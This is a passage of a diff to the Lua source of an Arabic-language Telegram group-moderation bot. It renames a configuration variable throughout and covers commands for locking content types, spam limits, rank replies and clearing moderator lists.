 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙التوجيه بالفعل مفتوح في المجموعه', 1, 'md')
 end
 end
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text and text:match("^قفل التفليش$") or text and text:match("^تفعيل الحمايه القصوى$") then
 if not Constructor(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙للمنشئين فقط', 1, 'md')
 else
-DevALI:set(Jenral.."ALI:Lock:Bots"..msg.chat_id_,"del") DevALI:hset(Jenral.."ALI:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
+DevALI:set(JENRAL.."ALI:Lock:Bots"..msg.chat_id_,"del") DevALI:hset(JENRAL.."ALI:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
 LockList ={'ALI:Lock:Links','ALI:Lock:Contact','ALI:Lock:Forwards','ALI:Lock:Videos','ALI:Lock:Gifs','ALI:Lock:EditMsgs','ALI:Lock:Stickers','ALI:Lock:Farsi','ALI:Lock:Spam','ALI:Lock:WebLinks','ALI:Lock:Photo'}
 for i,Lock in pairs(LockList) do
-DevALI:set(Jenral..Lock..msg.chat_id_,true)
+DevALI:set(JENRAL..Lock..msg.chat_id_,true)
 end
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل التفليش")  
 end
@@ -8112,24 +8100,24 @@ if text and text:match("^فتح التفليش$") then
 if not Constructor(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙للمنشئين فقط', 1, 'md')
 else
-DevALI:hdel(Jenral.."ALI:Spam:Group:User"..msg.chat_id_ ,"Spam:User") 
+DevALI:hdel(JENRAL.."ALI:Spam:Group:User"..msg.chat_id_ ,"Spam:User") 
 UnLockList ={'ALI:Lock:Links','ALI:Lock:Contact','ALI:Lock:Forwards','ALI:Lock:Videos','ALI:Lock:Gifs','ALI:Lock:EditMsgs','ALI:Lock:Stickers','ALI:Lock:Farsi','ALI:Lock:Spam','ALI:Lock:WebLinks','ALI:Lock:Photo'}
 for i,UnLock in pairs(UnLockList) do
-DevALI:del(Jenral..UnLock..msg.chat_id_)
+DevALI:del(JENRAL..UnLock..msg.chat_id_)
 end
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح التفليش")  
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text and text:match("^قفل الكل$") then
 if not Constructor(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙للمنشئين فقط', 1, 'md')
 else
-DevALI:del(Jenral..'ALI:Lock:Fshar'..msg.chat_id_) DevALI:del(Jenral..'ALI:Lock:Taf'..msg.chat_id_) DevALI:del(Jenral..'ALI:Lock:Kfr'..msg.chat_id_) 
-DevALI:set(Jenral.."ALI:Lock:Bots"..msg.chat_id_,"del") DevALI:hset(Jenral.."ALI:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
+DevALI:del(JENRAL..'ALI:Lock:Fshar'..msg.chat_id_) DevALI:del(JENRAL..'ALI:Lock:Taf'..msg.chat_id_) DevALI:del(JENRAL..'ALI:Lock:Kfr'..msg.chat_id_) 
+DevALI:set(JENRAL.."ALI:Lock:Bots"..msg.chat_id_,"del") DevALI:hset(JENRAL.."ALI:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
 LockList ={'ALI:Lock:EditMsgs','ALI:Lock:Farsi','ALI:Lock:TagServr','ALI:Lock:Inline','ALI:Lock:Photo','ALI:Lock:Spam','ALI:Lock:Videos','ALI:Lock:Gifs','ALI:Lock:Music','ALI:Lock:Voice','ALI:Lock:Links','ALI:Lock:Location','ALI:Lock:Tags','ALI:Lock:Stickers','ALI:Lock:Markdown','ALI:Lock:Forwards','ALI:Lock:Document','ALI:Lock:Contact','ALI:Lock:Hashtak','ALI:Lock:WebLinks'}
 for i,Lock in pairs(LockList) do
-DevALI:set(Jenral..Lock..msg.chat_id_,true)
+DevALI:set(JENRAL..Lock..msg.chat_id_,true)
 end
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل جميع الاوامر")  
 end
@@ -8138,30 +8126,30 @@ if text and text:match("^فتح الكل$") then
 if not Constructor(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙للمنشئين فقط', 1, 'md')
 else
-DevALI:set(Jenral..'ALI:Lock:Fshar'..msg.chat_id_,true) DevALI:set(Jenral..'ALI:Lock:Taf'..msg.chat_id_,true) DevALI:set(Jenral..'ALI:Lock:Kfr'..msg.chat_id_,true) DevALI:hdel(Jenral.."ALI:Spam:Group:User"..msg.chat_id_ ,"Spam:User") 
+DevALI:set(JENRAL..'ALI:Lock:Fshar'..msg.chat_id_,true) DevALI:set(JENRAL..'ALI:Lock:Taf'..msg.chat_id_,true) DevALI:set(JENRAL..'ALI:Lock:Kfr'..msg.chat_id_,true) DevALI:hdel(JENRAL.."ALI:Spam:Group:User"..msg.chat_id_ ,"Spam:User") 
 UnLockList ={'ALI:Lock:EditMsgs','ALI:Lock:Text','ALI:Lock:Arabic','ALI:Lock:English','ALI:Lock:Join','ALI:Lock:Bots','ALI:Lock:Farsi','ALI:Lock:FarsiBan','ALI:Lock:TagServr','ALI:Lock:Inline','ALI:Lock:Photo','ALI:Lock:Spam','ALI:Lock:Videos','ALI:Lock:Gifs','ALI:Lock:Music','ALI:Lock:Voice','ALI:Lock:Links','ALI:Lock:Location','ALI:Lock:Tags','ALI:Lock:Stickers','ALI:Lock:Markdown','ALI:Lock:Forwards','ALI:Lock:Document','ALI:Lock:Contact','ALI:Lock:Hashtak','ALI:Lock:WebLinks'}
 for i,UnLock in pairs(UnLockList) do
-DevALI:del(Jenral..UnLock..msg.chat_id_)
+DevALI:del(JENRAL..UnLock..msg.chat_id_)
 end
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح جميع الاوامر")  
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if Admin(msg) then
 if text and (text:match("^ضع سبام (%d+)$") or text:match("^وضع سبام (%d+)$")) then
 local SetSpam = text:match("ضع سبام (%d+)$") or text:match("وضع سبام (%d+)$")
 if tonumber(SetSpam) < 40 then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙اختر عدد اكبر من 40 حرف ', 1, 'md')
 else
-DevALI:set(Jenral..'ALI:Spam:Text'..msg.chat_id_,SetSpam)
+DevALI:set(JENRAL..'ALI:Spam:Text'..msg.chat_id_,SetSpam)
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم وضع عدد السبام ↫'..SetSpam, 1, 'md')
 end
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if Manager(msg) then
 if text == "فحص" or text == "فحص البوت" then
-local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..Jenral)
+local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..JENRAL)
 local GetInfo = JSON.decode(Check)
 if GetInfo.ok == true then
 if GetInfo.result.can_change_info == true then EDT = '✔️' else EDT = '✖️' end
@@ -8174,57 +8162,57 @@ Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙صلاحيات البوت هي ↫ ⤈\
 end end
 if text and text:match("^تغير رد المطور (.*)$") then
 local Text = text:match("^تغير رد المطور (.*)$") 
-DevALI:set(Jenral.."ALI:SudoBot:Rd"..msg.chat_id_,Text)
+DevALI:set(JENRAL.."ALI:SudoBot:Rd"..msg.chat_id_,Text)
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد المطور الى ↫ "..Text, 1, 'md')
 end
 if text and text:match("^تغير رد منشئ الاساسي (.*)$") then
 local Text = text:match("^تغير رد منشئ الاساسي (.*)$") 
-DevALI:set(Jenral.."ALI:BasicConstructor:Rd"..msg.chat_id_,Text)
+DevALI:set(JENRAL.."ALI:BasicConstructor:Rd"..msg.chat_id_,Text)
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد المنشئ الاساسي الى ↫ "..Text, 1, 'md')
 end
 if text and text:match("^تغير رد المنشئ (.*)$") then
 local Text = text:match("^تغير رد المنشئ (.*)$") 
-DevALI:set(Jenral.."ALI:Constructor:Rd"..msg.chat_id_,Text)
+DevALI:set(JENRAL.."ALI:Constructor:Rd"..msg.chat_id_,Text)
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد المنشئ الى ↫ "..Text, 1, 'md')
 end
 if text and text:match("^تغير رد المدير (.*)$") then
 local Text = text:match("^تغير رد المدير (.*)$") 
-DevALI:set(Jenral.."ALI:Managers:Rd"..msg.chat_id_,Text) 
+DevALI:set(JENRAL.."ALI:Managers:Rd"..msg.chat_id_,Text) 
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد المدير الى ↫ "..Text, 1, 'md')
 end
 if text and text:match("^تغير رد الادمن (.*)$") then
 local Text = text:match("^تغير رد الادمن (.*)$") 
-DevALI:set(Jenral.."ALI:Admins:Rd"..msg.chat_id_,Text)
+DevALI:set(JENRAL.."ALI:Admins:Rd"..msg.chat_id_,Text)
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد الادمن الى ↫ "..Text, 1, 'md')
 end
 if text and text:match("^تغير رد المميز (.*)$") then
 local Text = text:match("^تغير رد المميز (.*)$") 
-DevALI:set(Jenral.."ALI:VipMem:Rd"..msg.chat_id_,Text)
+DevALI:set(JENRAL.."ALI:VipMem:Rd"..msg.chat_id_,Text)
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد المميز الى ↫ "..Text, 1, 'md')
 end
 if text and text:match("^تغير رد المنظف (.*)$") then
 local Text = text:match("^تغير رد المنظف (.*)$") 
-DevALI:set(Jenral.."ALI:Cleaner:Rd"..msg.chat_id_,Text)
+DevALI:set(JENRAL.."ALI:Cleaner:Rd"..msg.chat_id_,Text)
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد المنظف الى ↫ "..Text, 1, 'md')
 end
 if text and text:match("^تغير رد العضو (.*)$") then
 local Text = text:match("^تغير رد العضو (.*)$") 
-DevALI:set(Jenral.."ALI:mem:Rd"..msg.chat_id_,Text)
+DevALI:set(JENRAL.."ALI:mem:Rd"..msg.chat_id_,Text)
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد العضو الى ↫ "..Text, 1, 'md')
 end
 if text == "حذف ردود الرتب" or text == "مسح ردود الرتب" then
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف جميع ردود الرتب", 1, 'md')
-DevALI:del(Jenral.."ALI:mem:Rd"..msg.chat_id_)
-DevALI:del(Jenral.."ALI:Cleaner:Rd"..msg.chat_id_)
-DevALI:del(Jenral.."ALI:VipMem:Rd"..msg.chat_id_)
-DevALI:del(Jenral.."ALI:Admins:Rd"..msg.chat_id_)
-DevALI:del(Jenral.."ALI:Managers:Rd"..msg.chat_id_)
-DevALI:del(Jenral.."ALI:Constructor:Rd"..msg.chat_id_)
-DevALI:del(Jenral.."ALI:BasicConstructor:Rd"..msg.chat_id_)
-DevALI:del(Jenral.."ALI:SudoBot:Rd"..msg.chat_id_)
+DevALI:del(JENRAL.."ALI:mem:Rd"..msg.chat_id_)
+DevALI:del(JENRAL.."ALI:Cleaner:Rd"..msg.chat_id_)
+DevALI:del(JENRAL.."ALI:VipMem:Rd"..msg.chat_id_)
+DevALI:del(JENRAL.."ALI:Admins:Rd"..msg.chat_id_)
+DevALI:del(JENRAL.."ALI:Managers:Rd"..msg.chat_id_)
+DevALI:del(JENRAL.."ALI:Constructor:Rd"..msg.chat_id_)
+DevALI:del(JENRAL.."ALI:BasicConstructor:Rd"..msg.chat_id_)
+DevALI:del(JENRAL.."ALI:SudoBot:Rd"..msg.chat_id_)
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == "كشف البوتات" and ChCheck(msg) then 
 tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(extra,result,success)
 local admins = result.members_  
@@ -8263,7 +8251,7 @@ for i=0 , #admins do
 if dp.members_[i].status_.ID == "ChatMemberStatusEditor" then  
 x = x + 1 
 end
-if tonumber(admins[i].user_id_) ~= tonumber(Jenral) then
+if tonumber(admins[i].user_id_) ~= tonumber(JENRAL) then
 ChatKick(msg.chat_id_,admins[i].user_id_)
 end
 c = c + 1
@@ -8275,50 +8263,50 @@ Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙*عدد البوتات هنا* ↫ "..c
 end 
 end,nil)  
 end 
---     Source Jenral     --
+--     Source JENRAL     --
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if Admin(msg) then
 if text and text:match("^حذف (.*)$") or text and text:match("^مسح (.*)$") then
 local txts = {string.match(text, "^(حذف) (.*)$")}
 local txtss = {string.match(text, "^(مسح) (.*)$")}
 if Sudo(msg) then 
 if txts[2] == 'الثانويين' or txtss[2] == 'الثانويين' or txts[2] == 'المطورين الثانويين' or txtss[2] == 'المطورين الثانويين' then
-DevALI:del(Jenral..'ALI:SecondSudo:')
+DevALI:del(JENRAL..'ALI:SecondSudo:')
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المطورين الثانويين")  
 end
 end
 if SecondSudo(msg) then 
 if txts[2] == 'المطورين' or txtss[2] == 'المطورين' then
-DevALI:del(Jenral..'ALI:SudoBot:')
+DevALI:del(JENRAL..'ALI:SudoBot:')
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المطورين")  
 end
 if txts[2] == 'قائمه العام' or txtss[2] == 'قائمه العام' then
-DevALI:del(Jenral..'ALI:BanAll:')
-DevALI:del(Jenral..'ALI:MuteAll:')
+DevALI:del(JENRAL..'ALI:BanAll:')
+DevALI:del(JENRAL..'ALI:MuteAll:')
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف قائمة العام")  
 end
 end
 if SudoBot(msg) then
 if txts[2] == 'الادمنيه العامين' or txts[2] == 'الادمنيه العام' or txtss[2] == 'الادمنيه العامين' or txtss[2] == 'الادمنيه العام' then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف الادمنيه العامين")  
-DevALI:del(Jenral..'ALI:AdminAll:')
+DevALI:del(JENRAL..'ALI:AdminAll:')
 end
 if txts[2] == 'المميزين عام' or txts[2] == 'المميزين العامين' or txtss[2] == 'المميزين عام' or txtss[2] == 'المميزين العامين' then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المميزين عام")  
-DevALI:del(Jenral..'ALI:VipAll:')
+DevALI:del(JENRAL..'ALI:VipAll:')
 end
 if txts[2] == 'المدراء العامين' or txts[2] == 'المدراء العام' or txtss[2] == 'المدراء العامين' or txtss[2] == 'المدراء العام' then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المدراء العامين")  
-DevALI:del(Jenral..'ALI:ManagerAll:')
+DevALI:del(JENRAL..'ALI:ManagerAll:')
 end
 if txts[2] == 'المالكين' or txtss[2] == 'المالكين' then
-DevALI:del(Jenral..'ALI:ALIConstructor:'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:ALIConstructor:'..msg.chat_id_)
 tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,dp) 
 local admins = dp.members_
 for i=0 , #admins do
 if dp.members_[i].status_.ID == "ChatMemberStatusCreator" then
-DevALI:sadd(Jenral.."ALI:ALIConstructor:"..msg.chat_id_,admins[i].user_id_)
+DevALI:sadd(JENRAL.."ALI:ALIConstructor:"..msg.chat_id_,admins[i].user_id_)
 end 
 end  
 end,nil)
@@ -8328,101 +8316,101 @@ end
 if ALIConstructor(msg) then
 if txts[2] == 'المنشئين الاساسيين' or txtss[2] == 'المنشئين الاساسيين' then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المنشئين الاساسيين")  
-DevALI:del(Jenral..'ALI:BasicConstructor:'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:BasicConstructor:'..msg.chat_id_)
 end
 end
 if BasicConstructor(msg) then
 if txts[2] == 'المنشئين' or txtss[2] == 'المنشئين' then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المنشئين")  
-DevALI:del(Jenral..'ALI:Constructor:'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Constructor:'..msg.chat_id_)
 end end
 if Constructor(msg) then
 if txts[2] == 'المدراء' or txtss[2] == 'المدراء' then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المدراء")  
-DevALI:del(Jenral..'ALI:Managers:'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Managers:'..msg.chat_id_)
 end 
 if txts[2] == 'المنظفين' or txtss[2] == 'المنظفين' then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المنظفين")  
-DevALI:del(Jenral..'ALI:Cleaner:'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Cleaner:'..msg.chat_id_)
 end end
 if Manager(msg) then
 if txts[2] == 'الادمنيه' or txtss[2] == 'الادمنيه' then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف الادمنيه")  
-DevALI:del(Jenral..'ALI:Admins:'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Admins:'..msg.chat_id_)
 end
 end
 if txts[2] == 'قوانين' or txtss[2] == 'قوانين' then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف القوانين")  
-DevALI:del(Jenral..'ALI:rules'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:rules'..msg.chat_id_)
 end
 if txts[2] == 'المطايه' or txtss[2] == 'المطايه' then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المطايه")  
-DevALI:del(Jenral..'User:Donky:'..msg.chat_id_)
+DevALI:del(JENRAL..'User:Donky:'..msg.chat_id_)
 end
 if txts[2] == 'الرابط' or txtss[2] == 'الرابط' then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف رابط المجموعه")  
-DevALI:del(Jenral.."ALI:Groups:Links"..msg.chat_id_)
+DevALI:del(JENRAL.."ALI:Groups:Links"..msg.chat_id_)
 end
 if txts[2] == 'المميزين' or txtss[2] == 'المميزين' then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المميزين")  
-DevALI:del(Jenral..'ALI:VipMem:'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:VipMem:'..msg.chat_id_)
 end
 if txts[2] == 'المكتومين' or txtss[2] == 'المكتومين' then
-DevALI:del(Jenral..'ALI:Muted:'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Muted:'..msg.chat_id_)
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المكتومين")  
 end
 if txts[2] == 'المقيدين' or txtss[2] == 'المقيدين' then     
-local List = DevALI:smembers(Jenral..'ALI:Tkeed:'..msg.chat_id_)
+local List = DevALI:smembers(JENRAL..'ALI:Tkeed:'..msg.chat_id_)
 for k,v in pairs(List) do   
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..v.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True") 
-DevALI:srem(Jenral..'ALI:Tkeed:'..msg.chat_id_, v)
+DevALI:srem(JENRAL..'ALI:Tkeed:'..msg.chat_id_, v)
 end 
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المقيدين")  
 end
 if txts[2] == 'قائمه المنع' or txtss[2] == 'قائمه المنع' then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف قائمة المنع")  
-DevALI:del(Jenral..'ALI:Filters:'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Filters:'..msg.chat_id_)
 end
 if txts[2] == 'قوائم المنع' or txtss[2] == 'قوائم المنع' then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف قوائم المنع")  
-DevALI:del(Jenral..'ALI:Filters:'..msg.chat_id_)
-DevALI:del(Jenral.."ALI:FilterAnimation"..msg.chat_id_)
-DevALI:del(Jenral.."ALI:FilterPhoto"..msg.chat_id_)
-DevALI:del(Jenral.."ALI:FilterSteckr"..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Filters:'..msg.chat_id_)
+DevALI:del(JENRAL.."ALI:FilterAnimation"..msg.chat_id_)
+DevALI:del(JENRAL.."ALI:FilterPhoto"..msg.chat_id_)
+DevALI:del(JENRAL.."ALI:FilterSteckr"..msg.chat_id_)
 end
 if txts[2] == 'قائمه منع المتحركات' or txtss[2] == 'قائمه منع المتحركات' then     
-DevALI:del(Jenral.."ALI:FilterAnimation"..msg.chat_id_)
+DevALI:del(JENRAL.."ALI:FilterAnimation"..msg.chat_id_)
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف قائمة منع المتحركات")  
 end
 if txts[2] == 'قائمه منع الصور' or txtss[2] == 'قائمه منع الصور' then     
-DevALI:del(Jenral.."ALI:FilterPhoto"..msg.chat_id_)
+DevALI:del(JENRAL.."ALI:FilterPhoto"..msg.chat_id_)
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف قائمة منع الصور")  
 end
 if txts[2] == 'قائمه منع الملصقات' or txtss[2] == 'قائمه منع الملصقات' then     
-DevALI:del(Jenral.."ALI:FilterSteckr"..msg.chat_id_)
+DevALI:del(JENRAL.."ALI:FilterSteckr"..msg.chat_id_)
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف قائمة منع الملصقات")  
 end
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text and text:match("^حذف القوائم$") and ChCheck(msg) or text and text:match("^مسح القوائم$") and ChCheck(msg) then
 if not BasicConstructor(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙للمنشئ الاساسي فقط', 1, 'md')
 else
-DevALI:del(Jenral..'ALI:Ban:'..msg.chat_id_) DevALI:del(Jenral..'ALI:Admins:'..msg.chat_id_) DevALI:del(Jenral..'User:Donky:'..msg.chat_id_) DevALI:del(Jenral..'ALI:VipMem:'..msg.chat_id_) DevALI:del(Jenral..'ALI:Filters:'..msg.chat_id_) DevALI:del(Jenral..'ALI:Muted:'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Ban:'..msg.chat_id_) DevALI:del(JENRAL..'ALI:Admins:'..msg.chat_id_) DevALI:del(JENRAL..'User:Donky:'..msg.chat_id_) DevALI:del(JENRAL..'ALI:VipMem:'..msg.chat_id_) DevALI:del(JENRAL..'ALI:Filters:'..msg.chat_id_) DevALI:del(JENRAL..'ALI:Muted:'..msg.chat_id_)
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف ↫ ❨ قائمة المنع • المحظورين • المكتومين • الادمنيه • المميزين • المطايه ❩ بنجاح \n ✓", 1, 'md')
 end end
---     Source Jenral     --
+--     Source JENRAL     --
 if text and text:match("^حذف جميع الرتب$") and ChCheck(msg) or text and text:match("^مسح جميع الرتب$") and ChCheck(msg) or text and text:match("^تنزيل جميع الرتب$") and ChCheck(msg) then
 if not ALIConstructor(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙للمالكين فقط', 1, 'md')
 else
-local basicconstructor = DevALI:smembers(Jenral..'ALI:BasicConstructor:'..msg.chat_id_)
-local constructor = DevALI:smembers(Jenral..'ALI:Constructor:'..msg.chat_id_)
-local Managers = DevALI:smembers(Jenral..'ALI:Managers:'..msg.chat_id_)
-local admins = DevALI:smembers(Jenral..'ALI:Admins:'..msg.chat_id_)
-local vipmem = DevALI:smembers(Jenral..'ALI:VipMem:'..msg.chat_id_)
-local donky = DevALI:smembers(Jenral..'User:Donky:'..msg.chat_id_)
+local basicconstructor = DevALI:smembers(JENRAL..'ALI:BasicConstructor:'..msg.chat_id_)
+local constructor = DevALI:smembers(JENRAL..'ALI:Constructor:'..msg.chat_id_)
+local Managers = DevALI:smembers(JENRAL..'ALI:Managers:'..msg.chat_id_)
+local admins = DevALI:smembers(JENRAL..'ALI:Admins:'..msg.chat_id_)
+local vipmem = DevALI:smembers(JENRAL..'ALI:VipMem:'..msg.chat_id_)
+local donky = DevALI:smembers(JENRAL..'User:Donky:'..msg.chat_id_)
 if #basicconstructor ~= 0 then basicconstructort = 'المنشئين الاساسيين • ' else basicconstructort = '' end
 if #constructor ~= 0 then constructort = 'المنشئين • ' else constructort = '' end
 if #Managers ~= 0 then Managerst = 'المدراء • ' else Managerst = '' end
@@ -8430,80 +8418,80 @@ if #admins ~= 0 then adminst = 'الادمنيه • ' else adminst = '' end
 if #vipmem ~= 0 then vipmemt = 'المميزين • ' else vipmemt = '' end
 if #donky ~= 0 then donkyt = 'المطايه • ' else donkyt = '' end
 if #basicconstructor ~= 0 or #constructor ~= 0 or #Managers ~= 0 or #admins ~= 0 or #vipmem ~= 0 or #donky ~= 0 then 
-DevALI:del(Jenral..'ALI:BasicConstructor:'..msg.chat_id_)
-DevALI:del(Jenral..'ALI:Constructor:'..msg.chat_id_)
-DevALI:del(Jenral..'ALI:Managers:'..msg.chat_id_)
-DevALI:del(Jenral..'ALI:Admins:'..msg.chat_id_)
-DevALI:del(Jenral..'ALI:VipMem:'..msg.chat_id_)
-DevALI:del(Jenral..'User:Donky:'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:BasicConstructor:'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Constructor:'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Managers:'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Admins:'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:VipMem:'..msg.chat_id_)
+DevALI:del(JENRAL..'User:Donky:'..msg.chat_id_)
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف جميع الرتب التاليه ↫ ❨ "..basicconstructort..constructort..Managerst..adminst..vipmemt..donkyt.." ❩ بنجاح \n ✓", 1, 'md')
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙لاتوجد رتب هنا", 1, 'md')
 end 
 end 
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if Admin(msg) then 
 if text and text:match("^الاعدادات$") and ChCheck(msg) then
-if not DevALI:get(Jenral..'ALI:Spam:Text'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Spam:Text'..msg.chat_id_) then
 spam_c = 400
 else
-spam_c = DevALI:get(Jenral..'ALI:Spam:Text'..msg.chat_id_)
+spam_c = DevALI:get(JENRAL..'ALI:Spam:Text'..msg.chat_id_)
 end
---     Source Jenral     --
-if DevALI:hget(Jenral.."ALI:Spam:Group:User"..msg.chat_id_, "Spam:User") == "kick" then     
+--     Source JENRAL     --
+if DevALI:hget(JENRAL.."ALI:Spam:Group:User"..msg.chat_id_, "Spam:User") == "kick" then     
 flood = "بالطرد"     
-elseif DevALI:hget(Jenral.."ALI:Spam:Group:User"..msg.chat_id_,"Spam:User") == "keed" then     
+elseif DevALI:hget(JENRAL.."ALI:Spam:Group:User"..msg.chat_id_,"Spam:User") == "keed" then     
 flood = "بالتقيد"     
-elseif DevALI:hget(Jenral.."ALI:Spam:Group:User"..msg.chat_id_,"Spam:User") == "mute" then     
+elseif DevALI:hget(JENRAL.."ALI:Spam:Group:User"..msg.chat_id_,"Spam:User") == "mute" then     
 flood = "بالكتم"           
-elseif DevALI:hget(Jenral.."ALI:Spam:Group:User"..msg.chat_id_,"Spam:User") == "del" then     
+elseif DevALI:hget(JENRAL.."ALI:Spam:Group:User"..msg.chat_id_,"Spam:User") == "del" then     
 flood = "بالحذف"
 else     
 flood = "مفتوح"     
 end
---     Source Jenral     --
-if DevALI:get(Jenral.."ALI:Lock:Bots"..msg.chat_id_) == "del" then
+--     Source JENRAL     --
+if DevALI:get(JENRAL.."ALI:Lock:Bots"..msg.chat_id_) == "del" then
 lock_bots = "بالحذف"
-elseif DevALI:get(Jenral.."ALI:Lock:Bots"..msg.chat_id_) == "ked" then
+elseif DevALI:get(JENRAL.."ALI:Lock:Bots"..msg.chat_id_) == "ked" then
 lock_bots = "بالتقيد"   
-elseif DevALI:get(Jenral.."ALI:Lock:Bots"..msg.chat_id_) == "kick" then
+elseif DevALI:get(JENRAL.."ALI:Lock:Bots"..msg.chat_id_) == "kick" then
 lock_bots = "بالطرد"    
 else
 lock_bots = "مفتوحه"    
 end
---     Source Jenral     --
-if DevALI:get(Jenral..'ALI:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه'end
-if DevALI:get(Jenral..'ALI:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفله' else mute_photo = 'مفتوحه' end
-if DevALI:get(Jenral..'ALI:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفله' else mute_video = 'مفتوحه' end
-if DevALI:get(Jenral..'ALI:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفله' else mute_gifs = 'مفتوحه' end
-if DevALI:get(Jenral..'ALI:Lock:Music'..msg.chat_id_) then mute_music = 'مقفله' else mute_music = 'مفتوحه' end
